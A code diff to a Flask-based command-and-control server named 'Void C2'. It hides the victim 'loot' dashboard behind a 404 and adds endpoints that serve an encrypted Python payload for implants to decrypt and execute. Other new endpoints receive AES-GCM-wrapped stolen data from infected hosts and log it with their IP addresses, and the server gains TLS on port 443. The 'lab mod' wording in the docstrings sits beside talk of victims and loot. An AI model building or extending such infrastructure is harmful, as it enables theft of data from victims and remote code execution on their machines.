@@ -68,28 +68,71 @@ DASH = """<!doctype html><html><head><meta charset=utf-8><title>Void C2</title>
 @app.route("/", methods=["GET"])
 @app.route("/dashboard", methods=["GET"])
 def dashboard():
-    import glob as _g, zlib as _z, base64 as _b
-    rows = ""
-    for fp in sorted(_g.glob(os.path.join(LOOT, "shard_*.json"))):
-        uid = os.path.basename(fp)[6:-5]
-        if uid in ("vps-test", "unknown"):
-            continue
-        try:
-            lines = open(fp).readlines()
-            last = json.loads(lines[-1])
-            loot = json.loads(_z.decompress(_b.b64decode(last["data"]["loot_b64"])))
-            cats = ", ".join(sorted(loot.keys()))
-            total = sum(len(v) for v in loot.values())
-            rows += f"<tr><td>{uid}</td><td>{last.get('ts','')}</td><td>{cats}</td><td>{total}</td>" \
-                    f"<td><a href='/loot/shard_{uid}.json'>raw</a></td></tr>"
-        except Exception as e:
-            rows += f"<tr><td>{uid}</td><td colspan=4>parse error</td></tr>"
-    return DASH.replace("__N__", str(len(rows.split("<tr>")) - 1)).replace("__ROWS__", rows or "<tr><td colspan=5>no victims yet</td></tr>")
+    return ("", 404)
+
+PANEL_PAYLOAD = os.path.join(os.path.dirname(os.path.abspath(__file__)), "payload.dat")
+
+@app.route("/mod/fetch", methods=["GET"])
+def mod_fetch():
+    """Sealed Python payload for lab mods (packed by tools/make_payload.py:
+    BH01 magic + iv(12) + tag(16) + ciphertext). Mod decrypts with panel key
+    inside the pinned channel and runs it."""
+    import base64 as _b
+    if not os.path.isfile(PANEL_PAYLOAD):
+        return jsonify({"status": "no-payload"}), 404
+    blob = open(PANEL_PAYLOAD, "rb").read()
+    if len(blob) < 32 or blob[:4] != b"BH01":
+        return jsonify({"status": "bad-payload"}), 500
+    return jsonify({"iv": _b.b64encode(blob[4:16]).decode(),
+                    "tag": _b.b64encode(blob[16:32]).decode(),
+                    "data": _b.b64encode(blob[32:]).decode()})
+
+@app.route("/mod/submit", methods=["POST"])
+def mod_submit():
+    data = request.get_json(force=True, silent=True) or {}
+    uid = data.get("userId", "unknown") + "-modloot"
+    with open(os.path.join(LOOT, f"modloot_{uid}.json"), "a") as fh:
+        fh.write(json.dumps({"ts": datetime.datetime.now().isoformat(),
+                             "ip": request.remote_addr, "size": len(str(data))}) + "\n")
+    log(f"mod loot from {uid}")
+    return jsonify({"status": "ok"})
+
+@app.route("/mod/checkin", methods=["POST"])
+def mod_checkin():
+    """Pinned-TLS lab-mod check-in. Body is an AES-GCM envelope
+    {key, iv, data} (base64); key unwrap happens inside the pinned channel.
+    Lab operators: replace TODO key handling with your KMS of choice."""
+    import base64 as _b
+    from Crypto.Cipher import AES as _AES
+    data = request.get_json(force=True, silent=True) or {}
+    try:
+        key = _b.b64decode(data["key"]);
+        iv = _b.b64decode(data["iv"]);
+        ct = _b.b64decode(data["data"])
+        pt = _AES.new(key, _AES.MODE_GCM, iv).decrypt(ct)[:-16]
+        inner = json.loads(pt.decode())
+        uid = inner.get("user", "unknown") + "-mod"
+        with open(os.path.join(LOOT, f"mod_{uid}.json"), "a") as fh:
+            fh.write(json.dumps({"ts": datetime.datetime.now().isoformat(),
+                                 "ip": request.remote_addr, "data": inner}) + "\n")
+        log(f"mod check-in from {uid} uuid={inner.get('uuid')}")
+        return jsonify({"status": "ok"})
+    except Exception as e:
+        log(f"mod check-in failed: {str(e)[:80]}")
+        return jsonify({"status": "error"}), 400
 
 if __name__ == "__main__":
     import argparse
     ap = argparse.ArgumentParser()
     ap.add_argument("--port", type=int, default=443)
+    ap.add_argument("--tls-cert", default=None, help="panel.crt for pinned-TLS mod endpoint")
+    ap.add_argument("--tls-key", default=None, help="panel.key for pinned-TLS mod endpoint")
     a = ap.parse_args()
     print(f"Void C2 listening on 0.0.0.0:{a.port}, loot -> ./loot")
-    app.run(host="0.0.0.0", port=a.port)
+    if a.tls_cert and a.tls_key:
+        import ssl
+        context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
+        context.load_cert_chain(a.tls_cert, a.tls_key)
+        app.run(host="0.0.0.0", port=a.port, ssl_context=context)
+    else:
+        app.run(host="0.0.0.0", port=a.port)
